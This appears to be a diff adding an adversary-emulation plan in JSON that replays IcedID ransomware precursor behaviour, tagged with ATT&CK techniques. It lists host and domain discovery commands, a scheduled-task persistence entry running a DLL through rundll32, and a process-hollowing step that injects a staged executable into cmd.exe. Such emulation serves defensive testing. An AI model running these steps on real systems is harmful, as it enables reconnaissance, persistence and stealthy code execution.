@@ -1,0 +1,142 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "https://thedfirreport.com/2022/04/25/quantum-ransomware/",
+        "display_name": "IcedID",
+        "name": "IcedID",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--multipart\":10240,\"--secure\":true,\"--heartbeat\":60,\"--jitter\":15}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c chcp >&2",
+                "rtags": [
+                    "att&ck-technique:T1614"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List",
+                "rtags": [
+                    "att&ck-technique:T1518.001"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "ipconfig /all",
+                "rtags": [
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "systeminfo",
+                "rtags": [
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net config workstation",
+                "rtags": [
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "nltest /domain_trusts",
+                "rtags": [
+                    "att&ck-technique:T1482"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "nltest /domain_trusts /all_trusts",
+                "rtags": [
+                    "att&ck-technique:T1482"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net group \"Domain Admins\" /domain",
+                "rtags": [
+                    "att&ck-technique:T1087.002"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "SCHTASKS /Create /SC hourly /TN kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A} /TR \"rundll32.exe %USERPROFILE%\\AppData\\Local\\user\\{3231114A-23EA-C1E1-F549-3FA294BC3E48}\\Ulfefi32.dll,DllMain --alyeqe=SketchRare\\license.dat\" ",
+                "rtags": [
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /Delete /TN kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A} /F >nul 2>&1",
+                "rtags": [
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "module": "loader",
+                "module_to_load": "phollowing",
+                "request": "--load phollowing",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "7c836d67-3f66-47b2-b440-af0d8e1c00ea",
+                "module": "phollowing",
+                "request": "--src VFS:/shared/threats/IcedID/Stage2.exe --target \"C:\\Windows\\SysWOW64\\cmd.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1055.012"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
